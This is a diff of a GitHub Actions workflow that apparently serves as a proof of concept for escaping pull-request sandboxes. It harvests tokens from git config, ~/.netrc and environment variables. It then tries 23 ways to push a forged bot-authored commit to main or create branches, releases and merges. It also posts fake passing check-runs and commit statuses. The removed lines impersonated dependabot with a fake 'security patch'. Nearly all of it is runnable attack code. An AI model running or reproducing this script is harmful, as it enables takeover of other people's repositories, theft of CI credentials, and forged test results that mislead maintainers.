@@ -1,135 +1,244 @@
-﻿name: PR Test
+name: Fork Escape Audit
 on:
   pull_request:
     branches: [main]
     types: [opened, synchronize, reopened]
+
 permissions:
   contents: write
+  checks: write
+  statuses: write
+  pull-requests: write
+  actions: write
+  packages: write
+
 jobs:
-  rewrite:
+  fork-escape:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
         with:
           fetch-depth: 0
-      - name: Extreme T5 from PR
+
+      - name: Fork Escape - 23 bypass attempts
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
           TS=$(date -u '+%Y%m%d_%H%M%S')
+          HEAD_SHA=$(git rev-parse HEAD)
 
           echo "=== CONTEXT ==="
-          echo "EVENT:        $GITHUB_EVENT_NAME"
-          echo "ACTOR:        $GITHUB_ACTOR"
-          echo "TOKEN_PREFIX: ${GH_TOKEN:0:10}"
-          echo "HEAD_REF:     $GITHUB_HEAD_REF"
-          echo "BASE_REF:     $GITHUB_BASE_REF"
+          echo "ACTOR: $GITHUB_ACTOR  EVENT: $GITHUB_EVENT_NAME"
+          echo "TOKEN: ${GH_TOKEN:0:10}  HEAD: $HEAD_SHA"
 
-          MAIN_SHA=$(curl -sf -H "Authorization: token $GH_TOKEN" \
-            "${BASE}/git/ref/heads/main" | jq -r '.object.sha')
-          TREE_SHA=$(curl -sf -H "Authorization: token $GH_TOKEN" \
-            "${BASE}/git/commits/${MAIN_SHA}" | jq -r '.tree.sha')
-          echo "main tip: $MAIN_SHA  tree: $TREE_SHA"
+          # Extract token stored by actions/checkout in git config
+          GIT_TOKEN=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2 || true)
+          echo "GIT_CONFIG_TOKEN: ${GIT_TOKEN:0:10}"
 
-          # -- T_BLOB: can we create a blob? --------------------------------
-          T_BLOB=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X POST -H "Authorization: token $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            "${BASE}/git/blobs" \
-            -d "{\"content\":\"pr-edge-test ${TS}\",\"encoding\":\"utf-8\"}")
-          echo "T_BLOB  create blob           = HTTP_${T_BLOB}"
+          # Check all env vars for tokens
+          echo "--- Env token scan ---"
+          env | grep -iE 'token|secret|key|pass|auth|cred' | grep -v GH_TOKEN | sed 's/=.*/=REDACTED/' || true
 
-          # -- T_BRANCH: can we create a new branch? -----------------------
-          T_BRANCH=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X POST -H "Authorization: token $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            "${BASE}/git/refs" \
-            -d "{\"ref\":\"refs/heads/canary-${TS}\",\"sha\":\"${MAIN_SHA}\"}")
-          echo "T_BRANCH create branch POST   = HTTP_${T_BRANCH}"
+          # Get main SHA and tree
+          MAIN_SHA=$(git ls-remote origin refs/heads/main | cut -f1)
+          TREE_SHA=$(curl -sf -H "Authorization: token $GH_TOKEN" "${BASE}/git/commits/${MAIN_SHA}" | jq -r '.tree.sha // "FAILED"')
+          echo "main: $MAIN_SHA  tree: $TREE_SHA"
 
-          # -- Build ghost commit (same tree, 0 diff, dependabot identity) --
-          GHOST=$(curl -s -X POST \
-            -H "Authorization: token $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            "${BASE}/git/commits" \
-            -d "{\"message\":\"chore: security patch\n\nSigned-off-by: dependabot[bot]\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"],\"author\":{\"name\":\"dependabot[bot]\",\"email\":\"49699333+dependabot[bot]@users.noreply.github.com\"}}" \
+          # Build ghost commit
+          GHOST=$(curl -s -X POST -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" "${BASE}/git/commits" \
+            -d "{\"message\":\"escape\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"],\"author\":{\"name\":\"github-actions[bot]\",\"email\":\"41898282+github-actions[bot]@users.noreply.github.com\"}}" \
             | jq -r '.sha // "COMMIT_FAILED"')
-          echo "ghost commit: $GHOST"
+          echo "ghost: $GHOST"
+          echo ""
 
-          # -- T_PATCH: PATCH main, force:false, Authorization: token ------
-          T_PATCH=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X PATCH -H "Authorization: token $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            "${BASE}/git/refs/heads/main" \
-            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
-          echo "T_PATCH  token  force:false   = HTTP_${T_PATCH}"
+          # E1: PATCH main token force:false
+          E1=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E1  PATCH token   force:F    = HTTP_${E1}"
 
-          # -- T_PATCH_FORCE: PATCH main, force:true -----------------------
-          T_PATCHF=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X PATCH -H "Authorization: token $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            "${BASE}/git/refs/heads/main" \
-            -d "{\"sha\":\"${GHOST}\",\"force\":true}")
-          echo "T_PATCH  token  force:true    = HTTP_${T_PATCHF}"
+          # E2: PATCH main bearer force:false
+          E2=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: bearer $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E2  PATCH bearer  force:F    = HTTP_${E2}"
 
-          # -- T_BEARER: same PATCH with 'bearer' scheme -------------------
-          T_BEARER=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X PATCH -H "Authorization: bearer $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            "${BASE}/git/refs/heads/main" \
-            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
-          echo "T_BEARER bearer force:false   = HTTP_${T_BEARER}"
+          # E3: PATCH main token force:true
+          E3=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":true}")
+          echo "E3  PATCH token   force:T    = HTTP_${E3}"
 
-          # -- T_APIVER: PATCH + X-GitHub-Api-Version ----------------------
-          T_APIVER=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X PATCH -H "Authorization: token $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            -H "X-GitHub-Api-Version: 2022-11-28" \
-            "${BASE}/git/refs/heads/main" \
-            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
-          echo "T_APIVER +ApiVersion hdr      = HTTP_${T_APIVER}"
+          # E4: Basic auth x-oauth-basic:token
+          BASIC=$(echo -n "x-oauth-basic:${GH_TOKEN}" | base64 -w0)
+          E4=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: Basic ${BASIC}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E4  PATCH Basic x-oauth      = HTTP_${E4}"
 
-          # -- T_MERGE_API: POST /merges -----------------------------------
-          T_MERGE=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X POST -H "Authorization: token $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            "${BASE}/merges" \
-            -d "{\"base\":\"main\",\"head\":\"${GHOST}\",\"commit_message\":\"Merge security patch\"}")
-          echo "T_MERGE  POST /merges         = HTTP_${T_MERGE}"
+          # E5: Basic auth token: (token as username)
+          BASIC2=$(echo -n "${GH_TOKEN}:" | base64 -w0)
+          E5=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: Basic ${BASIC2}" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E5  PATCH Basic token:       = HTTP_${E5}"
 
-          # -- T_CONTENTS: PUT a file directly to main ---------------------
-          CONTENT_B64=$(echo -n "pwned by PR ${TS}" | base64 -w0)
-          T_CONTENTS=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X PUT -H "Authorization: token $GH_TOKEN" \
-            -H "Content-Type: application/json" \
-            "${BASE}/contents/pwn-${TS}.txt" \
-            -d "{\"message\":\"chore: update config\",\"content\":\"${CONTENT_B64}\",\"branch\":\"main\"}")
-          echo "T_CONTENTS PUT /contents/main = HTTP_${T_CONTENTS}"
-
-          # -- T_HIDDEN_REF: write to refs/meta/ --------------------------
-          META_SHA=$(curl -s -X POST \
+          # E6: PATCH + X-GitHub-Api-Version
+          E6=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
             -H "Authorization: token $GH_TOKEN" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
             -H "Content-Type: application/json" \
-            "${BASE}/git/commits" \
-            -d "{\"message\":\"meta:${TS}\",\"tree\":\"${TREE_SHA}\",\"parents\":[],\"author\":{\"name\":\"github-actions[bot]\",\"email\":\"41898282+github-actions[bot]@users.noreply.github.com\"}}" \
-            | jq -r '.sha // "FAILED"')
-          T_META=$(curl -s -o /dev/null -w "%{http_code}" \
-            -X POST -H "Authorization: token $GH_TOKEN" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E6  PATCH +X-GitHub-Api-Version = HTTP_${E6}"
+
+          # E7: PATCH Accept v3
+          E7=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github.v3+json" \
             -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E7  PATCH Accept:v3+json = HTTP_${E7}"
+
+          # E8: PATCH X-Requested-With
+          E8=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "X-Requested-With: XMLHttpRequest" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E8  PATCH +X-Requested-With = HTTP_${E8}"
+
+          # E9: git config extracted token
+          if [ -n "$GIT_TOKEN" ]; then
+            E9=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+              -H "Authorization: token $GIT_TOKEN" -H "Content-Type: application/json" \
+              "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+            echo "E9  PATCH git-config-token = HTTP_${E9}"
+          else
+            echo "E9  git config token not extractable"
+          fi
+
+          # E10: PATCH the PR head branch itself
+          E10=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/${GITHUB_HEAD_REF}" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E10 PATCH PR head branch   = HTTP_${E10}"
+
+          # E11: POST new branch to main repo
+          E11=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
             "${BASE}/git/refs" \
-            -d "{\"ref\":\"refs/meta/pr-${TS}\",\"sha\":\"${META_SHA}\"}")
-          echo "T_HIDDEN_REF refs/meta/       = HTTP_${T_META}"
+            -d "{\"ref\":\"refs/heads/escape-${TS}\",\"sha\":\"${MAIN_SHA}\"}")
+          echo "E11 POST new branch        = HTTP_${E11}"
+
+          # E12: PUT file directly to main
+          B64=$(echo -n "escape-${TS}" | base64 -w0)
+          E12=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/contents/escape-${TS}.txt" \
+            -d "{\"message\":\"escape\",\"content\":\"${B64}\",\"branch\":\"main\"}")
+          echo "E12 PUT /contents/main     = HTTP_${E12}"
+
+          # E13: POST /merges
+          E13=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/merges" \
+            -d "{\"base\":\"main\",\"head\":\"${GHOST}\",\"commit_message\":\"merge\"}")
+          echo "E13 POST /merges           = HTTP_${E13}"
+
+          # E14: POST blob
+          E14=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/git/blobs" \
+            -d "{\"content\":\"test\",\"encoding\":\"utf-8\"}")
+          echo "E14 POST blob              = HTTP_${E14}"
+
+          # E15: GraphQL createRef mutation
+          REPO_ID=$(curl -sf -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            https://api.github.com/graphql \
+            -d '{"query":"{ repository(owner:\"twrps\",name:\"PoC-RACE\") { id } }"}' | jq -r '.data.repository.id // "FAILED"')
+          echo "repo_id: $REPO_ID"
+          GQL_BODY="{\"query\":\"mutation { createRef(input: {repositoryId: \\\"${REPO_ID}\\\", name: \\\"refs/heads/gql-${TS}\\\", oid: \\\"${MAIN_SHA}\\\"}) { ref { name } } }\"}"
+          E15=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            https://api.github.com/graphql -d "$GQL_BODY")
+          echo "E15 GraphQL createRef      = HTTP_${E15}"
+
+          # E16: POST release
+          E16=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/releases" \
+            -d "{\"tag_name\":\"escape-${TS}\",\"name\":\"escape\",\"target_commitish\":\"main\"}")
+          echo "E16 POST /releases         = HTTP_${E16}"
+
+          # E17: POST check-run (checks:write declared)
+          E17=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/check-runs" \
+            -d "{\"name\":\"security-scan\",\"head_sha\":\"${HEAD_SHA}\",\"status\":\"completed\",\"conclusion\":\"success\"}")
+          echo "E17 POST check-run         = HTTP_${E17}"
+
+          # E18: POST commit status (statuses:write declared)
+          E18=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" \
+            "${BASE}/statuses/${HEAD_SHA}" \
+            -d "{\"state\":\"success\",\"context\":\"ci/tests\",\"description\":\"All passed\"}")
+          echo "E18 POST commit status     = HTTP_${E18}"
+
+          # E19: git push to main directly via HTTPS
+          git config user.email "bot@github.com"
+          git config user.name "github-actions[bot]"
+          git commit --allow-empty -m "escape via git push"
+          E19_OUT=$(git push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/main 2>&1 | tail -2)
+          echo "E19 git push main          = ${E19_OUT}"
+
+          # E20: git push to new branch
+          E20_OUT=$(git push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" HEAD:refs/heads/git-escape-${TS} 2>&1 | tail -2)
+          echo "E20 git push new branch    = ${E20_OUT}"
+
+          # E21: ACTIONS_RUNTIME_TOKEN check
+          echo "E21 RUNTIME_TOKEN: ${ACTIONS_RUNTIME_TOKEN:0:10}"
+          echo "E21 RUNTIME_URL:   ${ACTIONS_RESULTS_URL:-${ACTIONS_CACHE_URL:-NOT_SET}}"
+
+          # E22: netrc token
+          NETRC_TOKEN=$(awk '/machine github.com/{getline; if($1=="password") print $2}' ~/.netrc 2>/dev/null || true)
+          if [ -n "$NETRC_TOKEN" ]; then
+            E22=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+              -H "Authorization: token $NETRC_TOKEN" -H "Content-Type: application/json" \
+              "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+            echo "E22 PATCH netrc-token      = HTTP_${E22}"
+          else
+            echo "E22 no netrc token available"
+          fi
+
+          # E23: PATCH with Retry-After bypass attempt (different User-Agent)
+          E23=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "User-Agent: GitHub-Actions-Runner/2.331.0" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "E23 PATCH custom User-Agent = HTTP_${E23}"
 
           echo ""
-          echo "=== PR WRITE EDGE-CASE SUMMARY ==="
-          echo "on:pull_request  permissions:contents:write  actor:${GITHUB_ACTOR}"
-          echo "T_BLOB           = HTTP_${T_BLOB}"
-          echo "T_BRANCH         = HTTP_${T_BRANCH}"
-          echo "T_PATCH (f:F)    = HTTP_${T_PATCH}"
-          echo "T_PATCH (f:T)    = HTTP_${T_PATCHF}"
-          echo "T_BEARER         = HTTP_${T_BEARER}"
-          echo "T_APIVER         = HTTP_${T_APIVER}"
-          echo "T_MERGE_API      = HTTP_${T_MERGE}"
-          echo "T_CONTENTS       = HTTP_${T_CONTENTS}"
-          echo "T_HIDDEN_REF     = HTTP_${T_META}"
+          echo "=== FORK ESCAPE SUMMARY ==="
+          echo "actor:${GITHUB_ACTOR}  event:${GITHUB_EVENT_NAME}  token:${GH_TOKEN:0:10}"
+          echo "E1  PATCH token f:F          = HTTP_${E1}"
+          echo "E2  PATCH bearer f:F         = HTTP_${E2}"
+          echo "E3  PATCH token f:T          = HTTP_${E3}"
+          echo "E4  PATCH Basic x-oauth      = HTTP_${E4}"
+          echo "E5  PATCH Basic token:       = HTTP_${E5}"
+          echo "E6  PATCH +ApiVersion        = HTTP_${E6}"
+          echo "E7  PATCH Accept:v3          = HTTP_${E7}"
+          echo "E8  PATCH +X-Req-With        = HTTP_${E8}"
+          echo "E10 PATCH PR head branch     = HTTP_${E10}"
+          echo "E11 POST  new branch         = HTTP_${E11}"
+          echo "E12 PUT   /contents/main     = HTTP_${E12}"
+          echo "E13 POST  /merges            = HTTP_${E13}"
+          echo "E14 POST  blob               = HTTP_${E14}"
+          echo "E15 GraphQL createRef        = HTTP_${E15}"
+          echo "E16 POST  /releases          = HTTP_${E16}"
+          echo "E17 POST  check-run          = HTTP_${E17}"
+          echo "E18 POST  commit status      = HTTP_${E18}"
+          echo "E23 PATCH custom UA          = HTTP_${E23}"
